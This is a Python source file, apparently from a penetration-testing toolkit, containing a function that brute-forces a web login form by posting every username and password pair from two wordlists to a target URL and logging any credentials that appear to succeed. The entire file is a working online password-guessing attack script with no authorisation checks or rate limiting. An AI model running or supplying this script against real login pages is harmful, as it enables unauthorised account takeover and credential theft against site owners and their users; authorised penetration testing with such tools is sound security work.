import requests
from termcolor import colored
from datetime import datetime

def brute_force(url, username_path, password_path):
    report_path = r"D:\pen_test_toolkit\reports\report.txt"
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open(report_path, "a") as report:
        report.write(f"\n=== Brute Force Report ({timestamp}) ===\n")
        report.write(f"Target URL: {url}\n")

        try:
            with open(username_path, 'r') as ufile:
                usernames = ufile.read().splitlines()
            with open(password_path, 'r') as pfile:
                passwords = pfile.read().splitlines()
        except FileNotFoundError as e:
            error_msg = f"[!] File error: {e}"
            print(colored(error_msg, "red"))
            report.write(error_msg + "\n")
            return

        print(colored(f"[*] Starting brute force on {url}", "cyan"))
        report.write(f"[*] Starting brute force on {url}\n")

        for username in usernames:
            for password in passwords:
                data = {"username": username, "password": password}
                try:
                    response = requests.post(url, data=data, timeout=5)
                    if "Login failed" not in response.text:
                        success_msg = f"[+] Credentials found: {username}:{password}"
                        print(colored(success_msg, "green"))
                        report.write(success_msg + "\n")
                        return
                    else:
                        attempt_msg = f"[-] Tried: {username}:{password}"
                        print(colored(attempt_msg, "yellow"))
                        report.write(attempt_msg + "\n")
                except requests.RequestException as e:
                    err_msg = f"[!] Error connecting to {url}: {e}"
                    print(colored(err_msg, "red"))
                    report.write(err_msg + "\n")
                    return

        no_success_msg = "[-] No valid credentials found."
        print(colored(no_success_msg, "red"))
        report.write(no_success_msg + "\n")
